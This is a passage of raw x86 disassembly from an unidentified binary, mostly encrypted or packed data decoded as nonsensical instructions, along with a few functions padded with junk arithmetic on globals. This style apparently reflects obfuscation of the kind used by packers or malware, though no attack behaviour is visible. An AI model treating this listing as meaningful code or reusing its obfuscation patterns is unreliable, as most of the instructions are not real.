  40824b:	imul   esi,DWORD PTR [eax+0x23],0xaba3e339
  408252:	je     0x408220
  408254:	mov    dh,0x28
  408256:	sahf   
  408257:	or     al,0x33
  408259:	push   0x2963c11c
  40825e:	sti    
  40825f:	nop
  408260:	xor    bl,al
  408262:	scas   al,BYTE PTR es:[edi]
  408263:	inc    ebp
  408264:	adc    BYTE PTR [ebx-0x33ecddab],0x15
  40826b:	mov    bh,BYTE PTR [edi+0x20]
  40826e:	lods   al,BYTE PTR ds:[esi]
  40826f:	add    eax,DWORD PTR [ecx]
  408271:	adc    BYTE PTR [edi+ebx*8],ch
  408274:	mov    bl,0xcc
  408276:	or     BYTE PTR [esi],dl
  408278:	(bad)  
  408279:	hlt    
  40827a:	pop    ecx
  40827b:	mov    dh,0xf0
  40827d:	stc    
  40827e:	jb     0x408251
  408280:	dec    esp
  408281:	call   FWORD PTR [ecx+0x7e]
  408284:	ins    DWORD PTR es:[edi],dx
  408285:	test   eax,0xe574d973
  40828a:	test   BYTE PTR [ebp+eiz*4+0x2e],bh
  40828e:	fxch   st(6)
  408290:	out    0xcb,eax
  408292:	imul   edx,DWORD PTR [ebx+esi*4],0xffffffff
  408296:	add    DWORD PTR [edi+0x4446e567],0xf9f27003
  4082a0:	mov    ebp,0xb555ec1a
  4082a5:	inc    ebp
  4082a6:	and    esp,DWORD PTR [eax]
  4082a8:	popa   
  4082a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082aa:	inc    bl
  4082ac:	add    al,0xbd
  4082ae:	mov    al,ds:0x61c4778a
  4082b3:	aam    0x23
  4082b5:	cs pop esp
  4082b7:	out    0x8a,al
  4082b9:	mov    eax,0xe64ea7a4
  4082be:	mov    bl,0xb7
  4082c0:	jmp    0x70d4:0x71bcd673
  4082c7:	push   esp
  4082c8:	push   es
  4082c9:	in     al,0x4a
  4082cb:	mov    eax,0xf60604f0
  4082d0:	int3   
  4082d1:	cmp    al,0xe5
  4082d3:	dec    esp
  4082d4:	lahf   
  4082d5:	jecxz  0x40833b
  4082d7:	push   ss
  4082d8:	sbb    esi,ecx
  4082da:	sbb    ecx,esp
  4082dc:	mov    esp,0x1e6551b7
  4082e1:	dec    ebx
  4082e2:	xor    al,0x76
  4082e4:	sbb    eax,0x940c72e7
  4082e9:	pop    esi
  4082ea:	add    ah,BYTE PTR [edx+0x413afefc]
  4082f0:	dec    ecx
  4082f1:	jmp    0x9d83:0xa60e45f1
  4082f8:	sar    BYTE PTR [edx-0x3286b116],1
  4082fe:	mul    DWORD PTR [edi-0x34]
  408301:	jecxz  0x40828e
  408303:	mov    ds:0x389d5081,eax
  408308:	dec    edi
  408309:	(bad)  
  40830a:	scas   al,BYTE PTR es:[edi]
  40830b:	pop    edi
  40830c:	sbb    ecx,eax
  40830e:	mov    al,ds:0xa4f56394
  408313:	test   BYTE PTR [edx-0x3cfc9f74],0x78
  40831a:	adc    eax,0x558b1007
  40831f:	pop    esp
  408320:	xor    edx,DWORD PTR [esi]
  408322:	outs   dx,BYTE PTR es:[esi]
  408324:	xor    eax,0xfb48c1b3
  408329:	leave  
  40832a:	into   
  40832b:	add    ecx,DWORD PTR [ebp+0x729d1084]
  408331:	xor    al,BYTE PTR [eax]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e8f2
  408366:	adc    DWORD PTR ds:0x42e8e2,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x4306c2,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e8ee,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e8ee
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x430626,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43060a
  4083aa:	or     DWORD PTR ds:0x42ef8c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ef90,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43060e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e8e6,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43061a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e8f6,0x42e8ee
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e8ee,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43060e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43060e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43060e,esi
  408424:	cmp    DWORD PTR ds:0x43060e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42eb88
  40844d:	cmp    DWORD PTR ds:0x43060e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847e:	scas   al,BYTE PTR es:[edi]
  40847f:	aam    0x1b
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x4084e0
  40848a:	dec    edx
  40848b:	mov    dl,0xac
  40848d:	sub    eax,0xcb64adba
  408492:	in     eax,dx
  408493:	cld    
  408494:	mov    edx,0x9a22166d
  408499:	jno    0x8de65f06
  40849f:	sbb    DWORD PTR ds:0xed7f3b88,edx
  4084a5:	int    0xbc
  4084a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a8:	inc    ebp
  4084a9:	and    BYTE PTR [ebp+ecx*2+0x11],0xb1
  4084ae:	fcom   DWORD PTR [edi]
  4084b0:	jl     0x40845b
  4084b2:	sar    BYTE PTR [edx+0x66],1
  4084b5:	xor    BYTE PTR [ecx-0x1a],dh
  4084b8:	cli    
  4084b9:	mov    ch,0x7d
  4084bb:	fstp   QWORD PTR ds:0x240aab9e
  4084c1:	retf   
  4084c2:	int3   
  4084c3:	xchg   edx,eax
  4084c4:	gs hlt 
  4084c6:	into   
  4084c7:	dec    ecx
  4084c9:	xor    DWORD PTR [esi-0x32b0b71b],0x79
  4084d0:	es cmc 
  4084d2:	in     al,dx
  4084d3:	adc    al,BYTE PTR [edi-0x1]
  4084d6:	lahf   
  4084d7:	push   ebx
  4084d8:	sbb    eax,0xbc7c89f9
  4084de:	nop
  4084df:	jl     0x4084d0
  4084e1:	and    DWORD PTR [edx-0x13],eax
  4084e4:	push   ds
  4084e5:	or     cl,0xa3
  4084e8:	ins    BYTE PTR es:[edi],dx
  4084e9:	mov    bh,0x47
  4084eb:	dec    ebp
  4084ec:	into   
  4084ed:	daa    
  4084ee:	cmc    
  4084ef:	sub    edi,DWORD PTR [edi]
  4084f1:	std    
  4084f2:	pop    ebp
  4084f3:	or     ecx,DWORD PTR [eax-0x64]
  4084f6:	hlt    
  4084f7:	in     eax,dx
  4084f8:	pop    ebp
  4084f9:	cmp    al,0xf1
  4084fb:	xor    DWORD PTR [ebx+0x28],edx
  4084fe:	adc    al,0xb1
  408500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408501:	ds pop ss
  408503:	push   edi
  408504:	cs jecxz 0x408528
  408507:	jle    0x408571
  408509:	mov    ah,0xc7
  40850b:	sub    al,0x2
  40850d:	jb     0x4084cd
  40850f:	sub    BYTE PTR [ebp+0xc],al
  408512:	add    bh,bh
  408514:	(bad)  
  408516:	cmc    
  408517:	adc    bh,BYTE PTR [edi-0x1cd4ba64]
  40851d:	(bad)  
  40851e:	mov    ebp,0x64bdd137
  408523:	and    DWORD PTR ds:0xb8ac4f47,eax
  408529:	mov    eax,0x60bd59ee
  40852e:	or     ax,0xa012
  408532:	mov    dl,0x6b
  408534:	pop    ds
  408535:	aaa    
  408536:	mov    ss,WORD PTR [eax]
  408538:	out    dx,eax
  408539:	inc    esi
  40853a:	sub    BYTE PTR [ecx+esi*1+0x9],ah
  40853e:	sub    ecx,ecx
  408540:	(bad)  
  408541:	push   ds
  408542:	(bad)  
  408543:	xchg   ebp,eax
  408544:	(bad)  
  408545:	sahf   
  408546:	(bad)  
  408547:	call   0x118f7876
  40854c:	or     al,bl
  40854e:	mov    dh,0x2e
  408550:	and    DWORD PTR [esi-0x2f],0x432cb13b
  408557:	mov    ebp,0x457ef7e1
  40855c:	repnz cmp BYTE PTR [esi],dh
  40855f:	and    al,0x2c
  408561:	pop    ebx
  408562:	adc    al,0xf5
  408564:	pop    ss
  408565:	mov    eax,0xce05bc03
  40856a:	dec    eax
  40856b:	jae    0x40855b
  40856d:	not    DWORD PTR [ebx]
  40856f:	mov    al,ds:0x9c185c75
  408574:	je     0x408585
  408576:	cmc    
  408577:	pop    esp
  408578:	cli    
  408579:	(bad)  
  40857b:	mov    ch,0x2b
  40857d:	cmp    eax,0xcfd1ff10
  408582:	rol    DWORD PTR [ecx-0x63],0x6c
  408586:	mov    eax,ds:0x9b050a5a
  40858b:	(bad)
  40858f:	sub    ah,bh
  408591:	cwde   
  408592:	push   ecx
  408593:	lock sysenter 
  408596:	xchg   ebx,eax
  408597:	adc    al,0xa0
  408599:	lods   eax,DWORD PTR ds:[esi]
  40859a:	push   edi
  40859b:	xchg   ebx,eax
  40859c:	cmp    al,0x8
  40859e:	(bad)  
  40859f:	nop
  4085a0:	fs ins DWORD PTR es:[edi],dx
  4085a2:	jbe    0x4085a1
  4085a4:	cmc    
  4085a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085a6:	ja     0x4085f8
  4085a8:	jno    0x408606
  4085aa:	in     eax,0xb0
  4085ac:	hlt    
  4085ad:	inc    eax
  4085ae:	mov    ebx,0xe4b4c18f
  4085b3:	jno    0x408581
  4085b5:	push   0x963c70e9
  4085ba:	mov    al,0xb6
  4085bc:	ins    BYTE PTR es:[edi],dx
  4085bd:	sbb    DWORD PTR [ebx],0x1e
  4085c0:	mov    esi,DWORD PTR [ebp+0x69db0c6f]
  4085c6:	xor    eax,0x1cce6bd3
  4085cb:	add    dl,BYTE PTR [esi]
  4085cd:	cmp    eax,0x8db898ff
  4085d2:	mov    al,0x6a
  4085d4:	jmp    0xe695:0x173a3a56
  4085db:	mov    cl,0x1e
  4085dd:	outs   dx,DWORD PTR ds:[esi]
  4085de:	into   
  4085df:	push   ebx
  4085e0:	out    0x3f,al
  4085e2:	mov    bl,0xc5
  4085e4:	xlat   BYTE PTR ds:[ebx]
  4085e5:	xlat   BYTE PTR ds:[ebx]
  4085e6:	adc    al,0x30
  4085e8:	rcr    BYTE PTR [ecx],0x7a
  4085eb:	mov    dh,0x15
  4085ed:	xor    edx,DWORD PTR [eax-0x76f82470]
  4085f3:	iret   
  4085f4:	in     al,dx
  4085f5:	adc    eax,0xa014f122
  4085fa:	push   ss
  4085fb:	pop    ebp
  4085fc:	pop    edx
  4085fd:	xchg   esi,eax
  4085fe:	sbb    DWORD PTR [esi],ebx
  408600:	mov    DWORD PTR [eax+0x6a5529d9],ebp
  408606:	mov    BYTE PTR [edx],ah
  408608:	lahf   
  408609:	test   eax,0x310bbd7c
  40860e:	adc    ah,ch
  408610:	mov    esi,0xcfb920b3
  408615:	int3   
  408616:	rcr    DWORD PTR [ebp+0x5d],0xd2
  40861a:	shl    BYTE PTR [edi+0x35],0xc3
  40861e:	rol    BYTE PTR [eax+0x3b56c5c3],0xd0
  408625:	mov    al,0x40
  408627:	mov    al,ds:0xc7369738
  40862c:	inc    ecx
  40862d:	movsx  esi,BYTE PTR [eax]
  408630:	(bad)  
  408631:	imul   BYTE PTR [ebx-0x75]
  408634:	lds    esp,FWORD PTR [edi]
  408636:	loop   0x408661
  408638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408639:	mov    dh,0x75
  40863b:	inc    ebp
  40863c:	add    al,0xf7
  40863e:	or     al,0x36
  408640:	outs   dx,DWORD PTR ds:[esi]
  408641:	(bad)  
  408643:	mov    al,ds:0xb0becd8e
  408648:	inc    edx
  408649:	daa    
  40864a:	pop    ebx
  40864b:	sub    eax,0xd8ec49a5
  408650:	jne    0x4086b9
  408652:	aas    
  408653:	outs   dx,DWORD PTR ds:[esi]
  408654:	or     BYTE PTR cs:[edx],dl
  408657:	and    ebp,DWORD PTR ds:0x6e86fb1
  40865d:	sbb    ebp,ecx
  40865f:	cmp    DWORD PTR [ecx-0x1376cb28],eax
  408665:	jo     0x40862c
  408667:	mov    al,BYTE PTR [edi+0x48]
  40866a:	loope  0x408664
  40866c:	pop    esi
  40866d:	push   esi
  40866e:	pop    ebp
  40866f:	rcl    dl,cl
  408671:	test   al,0x33
  408673:	fidiv  DWORD PTR [ecx+edx*2]
  408676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408677:	std    
  408678:	aas    
  408679:	fcomp  st(7)
  40867b:	retf   
  40867c:	lods   al,BYTE PTR ds:[esi]
  40867d:	mov    ds:0x5e44138a,al
  408682:	xor    dh,BYTE PTR [esi+0x7e]
  408685:	jo     0x4086b4
  408687:	int    0x4e
  408689:	jo     0x4086a7
  40868b:	push   0x1b
  40868d:	test   DWORD PTR [edx+0x49a108bd],0x3f30d4dd
  408697:	test   BYTE PTR [ecx+ebx*1],ch
  40869a:	ja     0x40869b
  40869c:	mov    ebp,0x98417d5
  4086a1:	jecxz  0x4086ca
  4086a3:	ss loop 0x408655
  4086a6:	into   
  4086a7:	jno    0x4086a2
  4086a9:	mov    ah,0xf0
  4086ab:	pop    ebx
  4086ac:	mov    ch,0xa
  4086ae:	cmp    cl,dh
  4086b0:	sub    eax,0x3923d37
  4086b5:	mov    edx,0xaf2b29bf
  4086ba:	jge    0x40868d
  4086bc:	jg     0x4086ba
  4086be:	into   
  4086bf:	mov    dl,0x50
  4086c1:	aaa    
  4086c2:	imul   ebx,eax,0x6f
  4086c5:	xchg   ecx,eax
  4086c6:	pop    ds
  4086c7:	add    eax,0xc391e354
  4086cc:	mov    eax,0xb97db39c
  4086d1:	cld    
  4086d2:	cmp    DWORD PTR [edx+0x4ff57bfc],esi
  4086d8:	pushw  cs
  4086da:	and    BYTE PTR [ebp+0x506edd8],dl
  4086e0:	mov    al,ds:0x4a7df09e
  4086e5:	jmp    0x684f5b16
  4086ea:	mov    dh,0x13
  4086ec:	cmp    eax,0x1df02fd
  4086f1:	xchg   ebx,eax
  4086f2:	inc    DWORD PTR [esi-0x5afc9010]
  4086f8:	test   BYTE PTR [ebp+esi*2-0x74cbb3d4],0x9b
  408700:	xor    al,0xe6
  408702:	daa    
  408703:	fdiv   QWORD PTR [esi]
  408705:	ret    0x27a0
  408708:	ret    0x9476
  40870b:	sbb    al,0x67
  40870d:	mov    bl,0x8c
  40870f:	in     al,dx
  408710:	test   al,0xe0
  408712:	dec    esi
  408713:	icebp  
  408714:	push   ss
  408715:	pop    es
  408716:	xchg   esp,eax
  408717:	out    dx,eax
  408718:	repz jge 0x40870d
  40871b:	(bad)  [edi]
  40871d:	cli    
  40871e:	or     edi,DWORD PTR [ecx+0x6ad70c4b]
  408724:	mov    ebx,0x7cce318b
  408729:	xor    DWORD PTR ds:0x5eb57123,0xffffffba
  408730:	(bad)  
  408731:	fistp  WORD PTR [edi]
  408733:	xlat   BYTE PTR ds:[ebx]
  408734:	fadd   DWORD PTR [eax-0xa]
  408737:	imul   ecx,edi,0x3e
  40873a:	ja     0x4086be
  40873c:	jns    0x408789
  40873e:	mov    WORD PTR [ebx-0x14c94a2a],gs
  408744:	sub    ebx,DWORD PTR [ecx]
  408746:	sbb    ah,BYTE PTR [eax+0x32]
  408749:	stc    
  40874a:	pextrw ecx,mm2,0xbf
  40874e:	fwait
  40874f:	mov    ?,WORD PTR [eax+edx*2-0x13]
  408753:	sbb    cl,BYTE PTR [edx]
  408755:	imul   esp,esp,0xffffffc0
  408758:	mov    eax,ds:0x22cd35f
  40875d:	lock mov edx,0x536eb4ea
  408763:	(bad)  
  408764:	stos   DWORD PTR es:[edi],eax
  408765:	outs   dx,DWORD PTR ds:[esi]
  408766:	in     al,0x18
  408768:	lock inc edx
  40876b:	xor    edx,edx
  40876d:	mov    ecx,0x7264fcad
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  eax,QWORD PTR [esi+0x6e]
  40878c:	push   esi
  40878d:	jno    0x4087d2
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x40873f
  408797:	enter  0x5e49,0x99
  40879b:	xor    ah,BYTE PTR [edi+0xfa66d38]
  4087a1:	push   edx
  4087a2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087a4:	ds stc 
  4087a6:	xchg   esp,eax
  4087a7:	imul   edi,DWORD PTR [ecx+0x3811e2ec],0xffffff87
  4087ae:	fcmove st,st(4)
  4087b0:	aas    
  4087b1:	popa   
  4087b2:	jmp    0x6d54ae09
  4087b7:	outs   dx,BYTE PTR ds:[esi]
  4087b8:	or     dh,BYTE PTR [eax+0x4e4199e5]
  4087be:	ins    DWORD PTR es:[edi],dx
  4087bf:	xor    al,0xf7
  4087c1:	ret    
  4087c2:	jge    0x40874a
  4087c4:	mov    eax,ds:0x1556fcc1
  4087c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ca:	dec    ecx
  4087cb:	sub    eax,DWORD PTR [ecx+0x548d7f1e]
  4087d1:	jle    0x408829
  4087d3:	sub    DWORD PTR [eax+0x33],edi
  4087d6:	fs test eax,0x18eb293a
  4087dc:	mov    ebp,0xcdeab5d9
  4087e1:	call   0x9762cfc3
  4087e6:	inc    esi
  4087e7:	out    0x1d,eax
  4087e9:	ret    0x21a0
  4087ec:	mov    cs,WORD PTR [esi]
  4087ee:	add    dl,BYTE PTR [ebx+0x65892c95]
  4087f4:	inc    ebx
  4087f5:	pop    ebp
  4087f6:	sub    eax,0xec2f28a
  4087fb:	jno    0x408862
  4087fd:	lahf   
  4087fe:	sbb    BYTE PTR [esi],al
  408800:	popa   
  408801:	sub    edx,DWORD PTR [esi+0x31]
  408804:	rol    BYTE PTR [ecx+0x7c0d9f44],cl
  40880a:	jmp    ebx
  40880c:	pushf  
  40880d:	addr16 jae 0x408885
  408810:	loopne 0x408866
  408812:	dec    esi
  408813:	(bad)  
  408814:	dec    ebx
  408815:	call   0x41c6:0xbed93d71
  40881c:	in     al,0x38
  40881e:	(bad)  
  40881f:	icebp  
  408820:	les    esp,FWORD PTR [ebp+0x4ccd715c]
  408826:	hlt    
  408827:	cwde   
  408828:	(bad)  
  408829:	pop    esp
  40882a:	loope  0x4088a2
  40882c:	(bad)  
  40882d:	in     al,dx
  40882e:	push   esp
  40882f:	std    
  408830:	mov    dl,0xe5
  408832:	jnp    0x408869
  408834:	inc    edi
  408835:	mov    ah,0x4c
  408837:	and    DWORD PTR [ebp+0x43],eax
  40883a:	out    0x45,eax
  40883c:	cmp    edx,DWORD PTR [esi]
  40883e:	pop    edx
  40883f:	and    DWORD PTR [ebp+0x3618db29],ebx
  408845:	pop    ds
  408846:	adc    ah,BYTE PTR [edi-0x55bae3f2]
  40884c:	shr    BYTE PTR [esi+edx*8+0x4550535b],1
  408853:	push   cs
  408854:	pop    ebp
  408855:	cmp    dh,al
  408857:	(bad)  
  408858:	arpl   WORD PTR ss:[esi],cx
  40885b:	dec    ebp
  40885c:	daa    
  40885d:	push   esp
  40885e:	xchg   DWORD PTR [esi+0x2cc7b418],edi
  408864:	inc    ebp
  408865:	xchg   ebx,eax
  408866:	lahf   
  408867:	hlt    
  408868:	push   ecx
  408869:	ret    
  40886a:	xchg   dl,ah
  40886c:	dec    ecx
  40886d:	pop    esi
  40886e:	call   FWORD PTR [esi+edx*2+0x5c4dc03]
  408875:	or     ecx,DWORD PTR [ebx+0x42cafb5]
  40887b:	mov    dl,0x5b
  40887d:	pusha  
  40887e:	dec    ecx
  40887f:	pop    ds
  408880:	xchg   ecx,eax
  408881:	mov    bl,BYTE PTR [edx+0x3cf17701]
  408887:	test   DWORD PTR [esi-0xc10e760],ebp
  40888d:	cmp    eax,0x5958902a
  408892:	sbb    eax,ebx
  408894:	pusha  
  408895:	div    BYTE PTR [esi+0x7d]
  408898:	sub    eax,0x547a66c4
  40889d:	stos   DWORD PTR es:[edi],eax
  40889e:	cmp    DWORD PTR ds:0x8304ea97,ecx
  4088a4:	out    0x62,eax
  4088a6:	out    0x74,al
  4088a8:	jb     0x40891b
  4088aa:	sub    DWORD PTR [ebx-0x7d],eax
  4088ad:	in     eax,dx
  4088ae:	dec    edx
  4088af:	cdq    
  4088b0:	lahf   
  4088b1:	pause  
  4088b3:	cwde   
  4088b4:	ror    dh,0xc8
  4088b7:	dec    edx
  4088b8:	call   0xfff06065
  4088bd:	out    dx,al
  4088be:	sbb    BYTE PTR [edi+0x7ab6f099],bl
  4088c4:	xor    edi,DWORD PTR [esi+0x6a8af6ba]
  4088ca:	arpl   WORD PTR [esi+0x36],bp
  4088cd:	je     0x408898
  4088cf:	outs   dx,BYTE PTR ds:[esi]
  4088d0:	dec    esp
  4088d1:	xchg   edx,eax
  4088d2:	test   BYTE PTR [esi+0x1d3d8495],0x4c
  4088d9:	xchg   edx,eax
  4088da:	sbb    BYTE PTR [esi+0x1],al
  4088dd:	int3   
  4088de:	clc    
  4088df:	fwait
  4088e0:	mov    DWORD PTR ds:0xc764d00c,edx
  4088e6:	pop    edi
  4088e7:	adc    eax,ebp
  4088e9:	mov    BYTE PTR [esi],dh
  4088eb:	shl    BYTE PTR [edx-0x1ac1d95d],1
  4088f1:	setle  BYTE PTR [ecx-0x27]
  4088f5:	jmp    0xa1ec:0x8fedb04a
  4088fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088fd:	dec    esi
  4088fe:	jae    0x4088d1
  408900:	xchg   ecx,eax
  408901:	push   ds
  408902:	loopne 0x4088c3
  408904:	test   BYTE PTR [esi+0x17],bl
  408907:	rcl    DWORD PTR [ebx],cl
  408909:	adc    eax,0xa32cb539
  40890e:	pop    ss
  40890f:	mov    DWORD PTR [ecx-0x19607fbb],ebp
  408915:	in     eax,dx
  408916:	mov    ebp,0xe5524f86
  40891b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40891c:	shl    BYTE PTR [edx-0xd],1
  40891f:	push   esp
  408920:	pop    ebp
  408921:	dec    ecx
  408922:	pop    edx
  408923:	int3   
  408924:	push   eax
  408925:	mov    ebx,0xd5ed8528
  40892a:	adc    eax,0xdf68d2e1
  40892f:	mov    ah,0xa7
  408931:	mov    eax,ds:0xd549cce
  408936:	retf   
  408937:	lds    ebp,FWORD PTR [eax+0x3a66f648]
  40893d:	lea    ebp,ds:0x786decd0
  408943:	in     al,0x61
  408945:	(bad)  
  408946:	jecxz  0x4088fc
  408948:	mov    cl,0xab
  40894a:	retf   0x2cfc
  40894d:	xor    ebx,DWORD PTR [esi-0x6]
  408950:	sbb    BYTE PTR [eax-0x13],ch
  408953:	adc    DWORD PTR [eax+0x64],edi
  408956:	cmp    DWORD PTR [eax+0x26],ecx
  408959:	sbb    DWORD PTR [ecx+0x76],edi
  40895c:	nop
  40895d:	dec    ebp
  40895e:	and    al,0x2b
  408960:	mov    dh,0xd
  408962:	cmp    al,0x73
  408964:	jmp    0xc782:0xf344c03
  40896b:	aad    0x29
  40896d:	mov    edx,0x7f73e4a8
  408972:	xchg   esi,eax
  408973:	sub    esp,DWORD PTR [eax-0x5433697c]
  408979:	pop    ds
  40897a:	mov    dh,0xf8
  40897c:	pop    ebx
  40897d:	pop    ss
  40897e:	ds dec edx
  408980:	push   0x19
  408982:	jge    0x408959
  408984:	js     0x4089b2
  408986:	pop    ds
  408987:	into   
  408988:	inc    esi
  408989:	xchg   ebx,eax
  40898a:	inc    eax
  40898b:	loope  0x4089ca
  40898d:	cmp    BYTE PTR ds:0x291ab67f,dl
  408993:	clc    
  408994:	ja     0x40896d
  408996:	jle    0x408a14
  408998:	jmp    0x408993
  40899a:	dec    esp
  40899b:	mov    dh,0x19
  40899d:	add    ecx,DWORD PTR [ebx-0x2f]
  4089a0:	dec    esp
  4089a1:	aaa    
  4089a2:	xchg   esp,eax
  4089a3:	xlat   BYTE PTR ds:[ebx]
  4089a4:	adc    DWORD PTR [ecx-0x2f9413bf],ebx
  4089aa:	jmp    0x4089c8
  4089ac:	fwait
  4089ad:	mov    al,0xa0
  4089af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b0:	les    esp,FWORD PTR [ebx-0x59c4b53c]
  4089b6:	bound  ebp,QWORD PTR [ecx-0x79]
  4089b9:	add    ah,ah
  4089bb:	cli    
  4089bc:	add    DWORD PTR [edi],0x67b859a0
  4089c2:	xor    ecx,esi
  4089c4:	inc    edi
  4089c5:	add    BYTE PTR [ebp+ebp*8-0x1963c113],dl
  4089cc:	retf   
  4089cd:	je     0x408a1e
  4089cf:	dec    esp
  4089d0:	clc    
  4089d1:	jnp    0x408969
  4089d3:	xchg   ecx,edi
  4089d5:	inc    edx
  4089d6:	and    eax,ebp
  4089d8:	lahf   
  4089d9:	daa    
  4089da:	retf   0x5fc6
  4089dd:	mov    WORD PTR cs:[ecx],?
  4089e0:	daa    
  4089e1:	sub    eax,0x521a2e0e
  4089e6:	shl    dh,cl
  4089e8:	push   eax
  4089e9:	dec    edi
  4089ea:	add    BYTE PTR [eax-0x6518610a],cl
  4089f0:	xchg   ebx,eax
  4089f1:	and    eax,0x460d189a
  4089f6:	arpl   WORD PTR [eax],sp
  4089f8:	sbb    al,0x43
  4089fa:	pop    esp
  4089fb:	mov    dl,ch
  4089fd:	xor    dh,BYTE PTR [edx]
  4089ff:	mov    dl,0x1
  408a01:	and    DWORD PTR [edx+0x5c1a9b7f],eax
  408a07:	cs push eax
  408a09:	gs daa 
  408a0b:	and    eax,0x92b58c03
  408a10:	xor    BYTE PTR [ebp+0x40f956a7],cl
  408a16:	(bad)  
  408a18:	test   eax,0x9e1b21cb
  408a1d:	in     al,dx
  408a1e:	cwde   
  408a1f:	and    ah,BYTE PTR [ebp+0x2f]
  408a22:	push   es
  408a23:	sahf   
  408a24:	jmp    0x4089e5
  408a26:	not    BYTE PTR [edx-0x18787ef9]
  408a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2d:	es push esi
  408a2f:	xor    edi,ebx
  408a31:	inc    edi
  408a32:	lds    edx,FWORD PTR [ebx-0x69]
  408a35:	or     eax,0x5b164de8
  408a3a:	inc    esi
  408a3b:	sahf   
  408a3c:	pop    edx
  408a3d:	int3   
  408a3e:	inc    edx
  408a3f:	arpl   WORD PTR [ebp+0x7c],bx
  408a42:	adc    bl,bl
  408a44:	cmc    
  408a45:	call   0xf3f25772
  408a4a:	jmp    0xfac48a07
  408a4f:	xor    BYTE PTR [ebx+0x18],dh
  408a52:	xchg   BYTE PTR [ebp-0x69bc688e],cl
  408a58:	fsubr  st(7),st
  408a5a:	cwde   
  408a5b:	lods   al,BYTE PTR ds:[esi]
  408a5c:	ja     0x408a61
  408a5e:	xchg   edx,eax
  408a5f:	cdq    
  408a60:	lods   al,BYTE PTR ds:[esi]
  408a61:	test   al,0xff
  408a63:	stos   BYTE PTR es:[edi],al
  408a64:	push   ebp
  408a65:	jne    0x408a88
  408a67:	loope  0x408a64
  408a69:	xchg   ebx,eax
  408a6a:	sub    ah,BYTE PTR [ebx]
  408a6c:	fdiv   st,st(2)
  408a6e:	int3   
  408a6f:	jne    0x408a84
  408a71:	(bad)  
